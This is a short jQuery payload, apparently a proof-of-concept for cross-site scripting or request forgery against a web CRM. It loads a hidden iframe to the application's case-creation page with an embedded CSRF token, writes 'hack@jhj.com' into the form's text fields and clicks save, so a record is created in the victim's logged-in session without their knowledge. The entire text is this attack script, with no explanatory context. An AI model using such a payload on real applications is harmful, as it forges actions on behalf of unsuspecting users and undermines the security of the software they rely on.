//Adding Ticket

var iframe = jQuery("<iframe></iframe>");
jQuery(iframe).attr("src","Create.do?module=Cases&csrfparam=f36cd3b229ee57553d43ad58b6f6e969964b87032f7ba19caa735c4397d53e8c757e3d303e7975fa89c02b31a57759e5a34249fa7134fa2d53f8bfc4fcb22010");
jQuery(iframe).attr("onload","add_Ticket()");

jQuery("body").append(iframe);

function add_Ticket(){
jQuery(iframe).contents().find("input:text").val('hack@jhj.com') ;
jQuery(iframe).contents().find('#saveButtonId').click();
}
